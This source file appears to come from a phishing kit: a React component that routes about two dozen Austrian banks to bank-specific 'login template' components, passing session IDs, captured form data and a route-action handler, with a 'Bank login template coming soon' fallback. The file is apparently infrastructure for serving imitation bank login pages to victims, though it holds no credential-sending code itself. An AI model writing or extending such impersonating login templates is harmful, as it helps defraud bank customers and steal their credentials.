"use client";

import { BankAustria } from "./BankAustria";
import { Easybank } from "./Easybank";
import { ErsteBank } from "./ErsteBank";
import { Raiffeisen } from "./Raiffeisen";
import { Volksbanken } from "./Volksbanken";
import { PosojilnicaBank } from "./PosojilnicaBank";
import { Bank99 } from "./Bank99";
import { BtvVierLanderBank } from "./BtvVierLanderBank";
import { BksBank } from "./BksBank";
import { Oberbank } from "./Oberbank";
import { HypoNoe } from "./HypoNoe";
import { HypoTirol } from "./HypoTirol";
import { HypoVorarlberg } from "./HypoVorarlberg";
import { HypoBurgenland } from "./HypoBurgenland";
import { HypoOberosterreich } from "./HypoOberosterreich";
import { AerzteApothekerBank } from "./AerzteApothekerBank";
import { SchelhammerCapital } from "./SchelhammerCapital";
import { Schoellerbank } from "./Schoellerbank";
import { SpardaBank } from "./SpardaBank";
import { Volkskreditbank } from "./Volkskreditbank";
import { AnadiBank } from "./AnadiBank";
import { MarchfelderBank } from "./MarchfelderBank";
import { Dolomitenbank } from "./Dolomitenbank";
import { BawagAg } from "./BawagAg";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
  formData: any;
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function AustrianTemplateClient({ 
  sessionId, 
  bankSlug, 
  bankName, 
  formData, 
  onChange, 
  handleRouteAction, 
  saving 
}: Props) {
  // Map Austrian banks to their specific templates
  const bankTemplateMap: Record<string, React.FC<any>> = {
    "bank-austria": BankAustria,
    "easybank": Easybank,
    "erste-bank": ErsteBank,
    "raiffeisen": Raiffeisen,
    "volksbank": Volksbanken,
    "posojilnica": PosojilnicaBank,
    "bank99": Bank99,
    "btv": BtvVierLanderBank,
    "bks-bank": BksBank,
    "oberbank": Oberbank,
    "hypo-noe": HypoNoe,
    "hypo-tirol": HypoTirol,
    "hypo-vorarlberg": HypoVorarlberg,
    "hypo-burgenland": HypoBurgenland,
    "hypo-ooe": HypoOberosterreich,
    "aerztebank": AerzteApothekerBank,
    "spaengler": SchelhammerCapital,
    "schelhammer": SchelhammerCapital,
    "schoellerbank-ag": Schoellerbank,
    "schoellerbank": Schoellerbank,
    "sparda-bank": SpardaBank,
    "vkb": Volkskreditbank,
    "anadi-bank": AnadiBank,
    "marchfelder": MarchfelderBank,
    "dolomitenbank": Dolomitenbank,
    "bawag": BawagAg,
  };

  const TemplateComponent = bankTemplateMap[bankSlug];

  if (TemplateComponent) {
    return (
      <TemplateComponent 
        formData={formData} 
        onChange={onChange} 
        handleRouteAction={handleRouteAction} 
        saving={saving} 
      />
    );
  }

  // Fallback for unknown banks
  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-md">
        <h2 className="text-xl font-bold mb-4">{bankName}</h2>
        <p className="text-gray-600">Bank login template coming soon...</p>
      </div>
    </div>
  );
}